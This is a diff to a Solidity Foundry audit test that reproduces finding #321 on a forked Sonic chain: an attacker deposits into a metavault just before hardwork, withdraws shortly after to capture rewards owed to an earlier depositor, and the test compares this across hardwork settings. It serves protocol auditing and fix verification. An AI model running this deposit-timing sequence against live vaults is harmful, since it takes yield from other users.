@@ -25,6 +25,13 @@ contract MetaVaultSonicUpgradeAudit is Test {
     address public multisig;
     IPriceReader public priceReader;
 
+    struct Results321 {
+        address assetHackerReceived;
+        uint amountHackerReceived;
+        uint maxWithdrawBefore;
+        uint maxWithdrawAfter;
+    }
+
     constructor() {
         vm.selectFork(vm.createFork(vm.envString("SONIC_RPC_URL")));
         vm.rollFork(33291167); // Jun-11-2025 07:08:05 AM +UTC
@@ -237,44 +244,116 @@ contract MetaVaultSonicUpgradeAudit is Test {
 
     /// @notice #321: New depositor in metVault can deposit right before hardwork and grab rewards that don't belong to him
     function testMetaVaultReproduce321() public {
+        _upgradeMetaVault(address(metaVault));
+        _upgradeSubVaults(true);
+
         address victim = address(1);
         address hacker = address(2);
-        // ---------------------- Allow hardwork on deposit in all subvaults
-        _enableHardworkOnDeposit();
+
+        // ---------------------- Change vault-to-deposit to 0xf6Fc4Ea6c1E6DcB68C5FFab82F6c0aD2D4c94df9
+        {
+            address[] memory assets = metaVault.assetsForDeposit();
+            uint[] memory depositAmounts = _getAmountsForDeposit(1e6, assets);
+            _dealAndApprove(address(this), address(metaVault), assets, depositAmounts);
+            metaVault.depositAssets(assets, depositAmounts, 0, victim);
+            vm.roll(block.number + 6); // wait some time to get rewards
+        }
 
         // ---------------------- Victim deposits huge amount of assets and waits long time to get rewards
-        address[] memory assets = metaVault.assetsForDeposit();
-        uint[] memory depositAmounts = _getAmountsForDeposit(1e6, assets);
-        _dealAndApprove(victim, address(metaVault), assets, depositAmounts);
-        vm.prank(victim);
-        metaVault.depositAssets(assets, depositAmounts, 0, victim);
+        {
+            address[] memory assets = metaVault.assetsForDeposit();
+            uint[] memory depositAmountsVictim = _getAmountsForDeposit(1e6, assets);
+            _dealAndApprove(victim, address(metaVault), assets, depositAmountsVictim);
+            vm.prank(victim);
+            metaVault.depositAssets(assets, depositAmountsVictim, 0, victim);
+        }
+
         uint maxWithdraw0 = metaVault.balanceOf(victim);
         console.log("maxWithdraw0", maxWithdraw0);
 
-        vm.roll(block.number + 10_000); // wait some time to get rewards
+        // ---------------------- Victim waits a long tim to get rewards
+        vm.roll(block.number + 10_000);
 
-        // ---------------------- Get real maxWithdraw amount
+        // ---------------------- Get real maxWithdraw amount for the victim
         uint snapshotId = vm.snapshotState();
-        _doHardworkAllVaults();
-        uint maxWithdraw = metaVault.balanceOf(victim);
-        console.log("maxWithdraw", maxWithdraw);
-        console.log("Victim potential profit:", maxWithdraw - maxWithdraw0);
+        console.log("!!!!!!!!!!!!!hacked");
+        _setHardworkOnDeposit(true);
+        Results321 memory rHacked = _hackerTriesToGetProfit321(victim, 1, hacker, false);
         vm.revertToState(snapshotId);
 
-        // ---------------------- Hacker enters just before hardwork
-        assets = metaVault.assetsForDeposit();
-        depositAmounts = _getAmountsForDeposit(1000, assets);
+        snapshotId = vm.snapshotState();
+        console.log("!!!!!!!!!!!!!correct");
+        _setHardworkOnDeposit(true);
+        Results321 memory rCorrect = _hackerTriesToGetProfit321(victim, 1, hacker, true);
+        vm.revertToState(snapshotId);
+
+        snapshotId = vm.snapshotState();
+        console.log("!!!!!!!!!!!!!disabled");
+        _setHardworkOnDeposit(false);
+        Results321 memory rNoHW = _hackerTriesToGetProfit321(victim, 1, hacker, false);
+        vm.revertToState(snapshotId);
+
+        console.log("rHacked.assetHackerReceived", rHacked.assetHackerReceived);
+        console.log("rHacked.amountHackerReceived", rHacked.amountHackerReceived);
+        console.log("rHacked.maxWithdrawBefore", rHacked.maxWithdrawBefore);
+        console.log("rHacked.maxWithdrawAfter", rHacked.maxWithdrawAfter);
+
+        console.log("rCorrect.assetHackerReceived", rCorrect.assetHackerReceived);
+        console.log("rCorrect.amountHackerReceived", rCorrect.amountHackerReceived);
+        console.log("rCorrect.maxWithdrawBefore", rCorrect.maxWithdrawBefore);
+        console.log("rCorrect.maxWithdrawAfter", rCorrect.maxWithdrawAfter);
+
+        console.log("rNoHW.assetHackerReceived", rNoHW.assetHackerReceived);
+        console.log("rNoHW.amountHackerReceived", rNoHW.amountHackerReceived);
+        console.log("rNoHW.maxWithdrawBefore", rNoHW.maxWithdrawBefore);
+        console.log("rNoHW.maxWithdrawAfter", rNoHW.maxWithdrawAfter);
+    }
+
+    function _hackerTriesToGetProfit321(
+        address victim,
+        uint amountUsd,
+        address hacker,
+        bool hardworkBeforeDeposit
+    ) internal returns (
+        Results321 memory
+    ) {
+        console.log("_hackerTriesToGetProfit321");
+        uint maxWithdrawBefore = metaVault.balanceOf(victim);
+        console.log("vault to deposit", IMetaVault(metaVault.vaultForDeposit()).vaultForDeposit());
+        // ---------------------- Do hardwork before hacker deposit
+        if (hardworkBeforeDeposit) {
+            console.log("start hardwork");
+            vm.startPrank(multisig);
+            IVault(IMetaVault(metaVault.vaultForDeposit()).vaultForDeposit()).doHardWork();
+            vm.stopPrank();
+            console.log("end hardwork");
+        }
+
+        // ---------------------- Hacker enters
+        address[] memory assetToDeposit = metaVault.assetsForDeposit();
+        uint[] memory depositAmountsHacker = _getAmountsForDeposit(amountUsd, assetToDeposit);
+        _dealAndApprove(hacker, address(metaVault), assetToDeposit, depositAmountsHacker);
+
         vm.prank(hacker);
-        metaVault.depositAssets(assets, depositAmounts, 0, victim);
+        metaVault.depositAssets(assetToDeposit, depositAmountsHacker, 0, hacker);
 
-        _doHardworkAllVaults();
+        // ---------------------- Hacker withdraws
+        vm.roll(block.number + 6);
 
-        uint maxWithdraw2 = metaVault.balanceOf(victim);
-        uint maxWithdraw3 = metaVault.balanceOf(hacker);
-        console.log("maxWithdraw2", maxWithdraw2);
-        console.log("maxWithdraw3", maxWithdraw3);
-        console.log("Victim profit:", maxWithdraw2 - 1e6);
-        console.log("Hacker profit:", maxWithdraw3 - 1e3);
+        vm.roll(block.number + 6);
+
+        address[] memory assetsToWithdraw = IVault(metaVault.vaultForWithdraw()).assets();
+
+        vm.startPrank(hacker);
+        metaVault.withdrawAssets(assetsToWithdraw, metaVault.balanceOf(hacker), new uint[](1));
+        vm.stopPrank();
+
+        return Results321({
+            assetHackerReceived: assetsToWithdraw[0],
+            amountHackerReceived: IERC20(assetsToWithdraw[0]).balanceOf(hacker),
+            maxWithdrawBefore: maxWithdrawBefore,
+            maxWithdrawAfter: metaVault.balanceOf(victim)
+        });
     }
 
     //region ------------------------------ Auxiliary Functions
@@ -345,13 +424,13 @@ contract MetaVaultSonicUpgradeAudit is Test {
         }
     }
 
-    function _enableHardworkOnDeposit() internal {
+    function _setHardworkOnDeposit(bool allow) internal {
         address[] memory vaults0 = IMetaVault(address(metaVault)).vaults();
         for (uint i = 0; i < vaults0.length; i++) {
             address[] memory vaults = IMetaVault(address(vaults0[i])).vaults();
             for (uint j = 0; j < vaults.length; j++) {
                 vm.prank(multisig);
-                IVault(vaults[j]).setDoHardWorkOnDeposit(true);
+                IVault(vaults[j]).setDoHardWorkOnDeposit(allow);
             }
         }
     }
